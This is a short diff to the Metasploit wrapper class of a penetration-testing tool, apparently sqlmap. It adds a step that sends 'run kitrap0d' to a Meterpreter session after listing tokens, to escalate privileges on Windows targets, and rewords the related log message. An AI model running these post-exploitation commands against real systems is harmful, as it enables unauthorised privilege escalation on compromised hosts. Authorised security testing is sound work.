@@ -187,9 +187,10 @@ class Metasploit:
     def __selectPayload(self, askChurrasco=True):
         if kb.os == "Windows" and conf.privEsc:
             infoMsg  = "forcing Metasploit payload to Meterpreter because "
-            infoMsg += "it is the only payload that can abuse Windows "
-            infoMsg += "Access Tokens via Meterpreter 'incognito' "
-            infoMsg += "extension to privilege escalate"
+            infoMsg += "it is the only payload that can be used to "
+            infoMsg += "escalate privileges, either via 'incognito' "
+            infoMsg += "extension or via 'kitrap0d' script, "
+            infoMsg += "http://tinyurl.com/kitrap0d for details"
             logger.info(infoMsg)
 
             __payloadStr = "windows/meterpreter"
@@ -457,6 +458,12 @@ class Metasploit:
             logger.info(infoMsg)
 
             proc.stdin.write("list_tokens -u\n")
+
+            infoMsg  = "trying also to escalate privileges using "
+            infoMsg += "kitrap0d script"
+            logger.info(infoMsg)
+
+            proc.stdin.write("run kitrap0d\n")
 
     def __controlMsfCmd(self, proc, func):
         stdin_fd = sys.stdin.fileno()
